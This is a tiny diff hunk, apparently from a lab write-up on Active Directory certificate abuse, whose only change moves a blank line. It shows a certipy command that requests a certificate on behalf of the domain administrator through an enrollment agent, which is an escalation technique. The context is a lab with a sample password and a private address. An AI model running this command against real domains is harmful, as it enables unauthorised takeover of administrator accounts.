@@ -28,5 +28,5 @@ certipy req -u attacker -p 'P@ssw0rd' -target-ip 192.168.1.2 -ca 'lab-DC-CA' -te
 
 ```
 certipy req -u attacker -p 'P@ssw0rd' -target-ip 192.168.1.2 -ca 'lab-DC-CA' -template 'User' -on-behalf-of 'lab\administrator' -pfx 'attacker.pfx'
-
 ```
+
